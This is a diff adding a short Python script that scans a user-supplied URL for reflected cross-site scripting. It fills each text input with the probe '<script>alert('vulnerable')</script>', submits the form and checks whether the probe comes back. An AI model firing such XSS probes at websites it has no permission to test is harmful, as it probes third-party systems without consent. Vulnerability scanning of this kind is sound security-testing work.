@@ -1,0 +1,31 @@
+import requests
+from bs4 import BeautifulSoup
+
+url = input("Enter the URL to scan:")
+payload = "<script>alert('vulnerable')</script>"
+
+response = requests.get(url)
+
+soup = BeautifulSoup(response.text, "lxml")
+
+form_tags = soup.find_all("form")
+input_tags = soup.find_all("input")
+data_to_submit = {}
+
+for inp in input_tags:
+    input_name = inp.get("name")
+    input_type = inp.get("type")
+
+    if input_type == "text":
+        data_to_submit[input_name] = payload
+    elif input_type == "submit":
+        data_to_submit[input_name] = "Search"
+
+response = requests.post(url, data=data_to_submit)
+
+if payload in response.text:
+    print("This website is Vulnerable to xss attack")
+else:
+    print("Not Vulnerable")
+
+
